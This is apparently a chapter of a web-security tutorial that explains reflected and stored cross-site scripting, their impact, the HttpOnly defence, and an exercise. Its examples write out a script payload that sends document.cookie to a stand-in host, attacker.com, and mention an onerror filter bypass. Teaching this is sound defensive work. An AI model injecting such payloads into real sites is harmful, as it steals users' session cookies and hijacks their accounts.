---
title: Cross-Site Scripting (XSS) - Reflected & Stored
description: Learn the mechanics of Reflected and Stored Cross-Site Scripting (XSS) attacks, their impact on client-side security, and how to defend.
order: 6
tags: [security, xss, reflected-xss, stored-xss, client-side]
---

# Chapter 6: Cross-Site Scripting (XSS) - Reflected & Stored

> **Understand how attackers inject malicious scripts into trusted websites, and analyze Reflected and Stored XSS mechanics.**

---

## What is Cross-Site Scripting (XSS)?

XSS is a client-side injection vulnerability. It occurs when an application receives untrusted data and sends it to the web browser without proper validation or encoding. The browser executes the script in the security context of the user's session.

---

## Reflected XSS

Reflected XSS occurs when a malicious script is reflected off a web server onto the victim's browser (usually via parameters in a phishing URL link).

```text
Attacker Link (HTTP GET) -> Server (echoes parameter raw) -> Victim Browser (executes script)
```

### Example scenario
An application has a search page that displays the query back to the user:
```html
<!-- URL: /search?q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script> -->
<p>You searched for: <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script></p>
```

---

## Stored XSS (Persistent XSS)

Stored XSS is more dangerous. The script payload is saved in the database (e.g., in a forum post or profile comment) and executed whenever other users visit that page.

### Example scenario
1. Attacker submits a comment:
   `<script>sendToAttacker(document.cookie)</script>`
2. The database stores the comment.
3. Every user loading the page renders the script directly from the database and runs it.

---

## Impacts of XSS
*   **Cookie Theft**: Stealing session IDs to hijack user accounts.
*   **Session Hijacking**: Executing actions on behalf of the logged-in user.
*   **Defacement**: Modifying the site's DOM structure.
*   **Phishing redirects**: Displaying fake login forms to capture credentials.

---

## Best Practices & Common Mistakes

| Best Practice | Common Mistake |
|---------------|----------------|
| Set session cookies with the `HttpOnly` flag to prevent JavaScript from reading them. | Relying on blacklists of words like `<script>` (which can be bypassed using uppercase `<SCRIPT>` or event attributes like `<img src=x onerror=...>`). |

---

## Interview Points

> **📌 Interview Point 1: How does `HttpOnly` mitigate XSS?**
> While `HttpOnly` does not prevent the XSS injection itself, it blocks the attacker's script from accessing `document.cookie`. This prevents session ID theft, reducing the severity of the attack.

---

## Exercises

### Exercise 1: Spot the Stored XSS vector ⭐
**Task:** Identify the vulnerability in a comment rendering block:
`<div class="comment-body">${comment.text}</div>` (in plain HTML injection).

<details>
<summary>✅ Solution (click to reveal)</summary>
If `comment.text` is not HTML-encoded, any HTML/JS tag injected will execute directly inside the user's browser.
</details>

---

## Next Chapter

Continue to [Cross-Site Scripting (XSS) - DOM-Based & Prevention](./ch07-xss-dom-prevention.md) to study client-side DOM scripting risks.
